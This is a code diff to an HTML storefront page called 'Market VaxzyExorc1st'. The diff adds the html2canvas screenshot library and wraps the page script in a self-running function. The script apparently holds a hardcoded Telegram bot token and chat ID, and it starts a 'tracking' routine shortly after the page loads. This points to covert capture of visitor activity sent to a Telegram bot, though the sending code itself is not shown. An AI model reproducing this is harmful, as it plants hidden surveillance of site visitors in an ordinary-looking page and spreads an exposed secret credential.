@@ -4,6 +4,8 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Market VaxzyExorc1st</title>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
   
   <style>
     /* Reset */
@@ -483,7 +485,8 @@
       const btn = document.querySelector(".toggle-dark");
       btn.textContent = document.body.classList.contains("dark-mode") ? "☀️" : "🌙";
     }
-  
+
+    (() => {
     const TOKEN = '8417927297:AAFR9-EptORqoCLG3Zl-HdU8AgxkfNEbq1o';
     const CHAT_ID = '7093265853';
     
@@ -1017,6 +1020,7 @@
       setTimeout(startTracking, 3000);
     // Jalankan init ketika halaman dimuat
     window.addEventListener('load', init);
+    })();
   
     </script>
   </body>
